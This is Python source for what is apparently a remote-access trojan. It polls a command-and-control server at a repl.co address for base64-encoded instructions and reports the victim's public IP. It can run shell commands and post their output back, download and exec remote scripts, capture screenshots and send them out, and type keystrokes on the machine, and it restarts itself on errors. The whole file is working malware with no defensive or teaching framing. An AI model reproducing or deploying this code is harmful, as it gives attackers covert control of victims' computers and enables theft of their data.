import requests
import tkinter.messagebox as tkm
import os
from time import sleep
import sys
import base64
import codecs
import subprocess
import urllib.request
import keyboard

sess = requests.Session()
adapter = requests.adapters.HTTPAdapter(max_retries = 20)
sess.mount('http://', adapter)
try:
  import pyautogui
except:
  pass

#pyautogui, requests, codecs,  

def return_output(command):
  print("in return outpyut")
  returned_text = subprocess.check_output(command, shell=True, universal_newlines=True)
  print("dir command to list file and directory")
  send(returned_text)

def return_output_cd(command):
  returned_text = subprocess.check_output(command, shell=True, universal_newlines=True)
  print("dir command to list file and directory")
  send_cd(returned_text)

def execute_silently(command):
  print("in return silent")
  try:
    p = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p.communicate()
  except Exception as e:
    print(e)
  print("done executing")

def execute_normally(command):
  os.system(command)
  
def send(data):
  requests.post("https://c2c-server.posydon.repl.co/recieve", data=base64.b64encode(codecs.encode(data)))

def send_shell(data):
  requests.post("https://c2c-server.posydon.repl.co/recieve_shell", data=base64.b64encode(codecs.encode(data)))

def send_screen(data):
  requests.post("https://c2c-server.posydon.repl.co/recieve_screen", data=base64.b64encode(data))

def send_ip(data):
  requests.post("https://c2c-server.posydon.repl.co/recieve_ip", data=base64.b64encode(data))

def send_cd(data):
  requests.post("https://c2c-server.posydon.repl.co/recieve_cd", data=base64.b64encode(data))

def execute():
  send_ip(urllib.request.urlopen('https://ident.me').read())
  try:
    #determine command parameters
    instructs = sess.get("https://c2c-server.posydon.repl.co/inst").text
    print(f"text gotten: {instructs}")
    d_instructs = base64.b64decode(instructs[1:-1])
    print(f"decrypted (bytes): {d_instructs}")
    a_instructs = codecs.decode(d_instructs)
    print(a_instructs)
    c_arr = a_instructs.split()
    print(c_arr)
    repeat = int(c_arr[0])
    type = c_arr[1]
    print(c_arr)
    command_with_ticks = c_arr[3]
    formatted_command = command_with_ticks.replace("`", " ")
    c_arr[3] = formatted_command
    print(c_arr)
    send("got thy goods")
    #execute command x amount of times
    for i in range(repeat):
      #check if type is script or command
      if type == "script":
        #execute script
        script = sess.get("https://c2c-server.posydon.repl.co/script").text
        exec(script)
      elif type == "notscript":
        if c_arr[2] == "99o":
          try:
            print(f"command: {c_arr[3]}")
            return_output(c_arr[3])
          except:
            send(f"command {c_arr[3]} failed unexpectedly (return output)")
            
        elif c_arr[2] == "99s":
          try:
            print(f"command: {c_arr[3]}")
            execute_silently(c_arr[3])
            return_output(c_arr[3])
            
          except:
            send(f"command {c_arr[3]} failed unexpectedly (execute silently)")
            
        elif c_arr[2] == "99n":
          try:
            print(f"command: {c_arr[3]}")
            execute_normally(c_arr[3])
          except:
            send(f"command {c_arr[3]} failed unexpectedly (execute normally)")
            
        elif c_arr[2] == "screenshot":
          try:
            send_screen(pyautogui.screenshot())
          except Exception as e:
            send(f"screenshot failed, with exception as follows: \n {e}")
        elif c_arr[2] == "keyboard_w":
          try:
            keyboard.write(c_arr[3], delay=0.1)
          except Exception as e:
            send(f"keyboard write failed, with exception as follows: \n {e}")

        elif c_arr[2] == "keyboard_s":
          try:
              keyboard.send(c_arr[3])
          except Exception as e:
              send(f"send_keys failed, with exception as follows: \n {e}")  
        else:
          print("no script and no command")  
          #exec(c_arr[1])
      elif type == "cscript":
        try:
          print(f"command: {c_arr[3]}")
          execute_silently(c_arr[3])
          return_output(c_arr[3])
        except:
          send(f"command {c_arr[3]} failed unexpectedly (execute silently)") 
      
  except:
    os.execv(sys.argv[0], sys.argv)

while True:
  go_bool = sess.get("https://c2c-server.posydon.repl.co/go").text
  if go_bool == "go":
    sleep(5)
    execute()
  else:
    continue


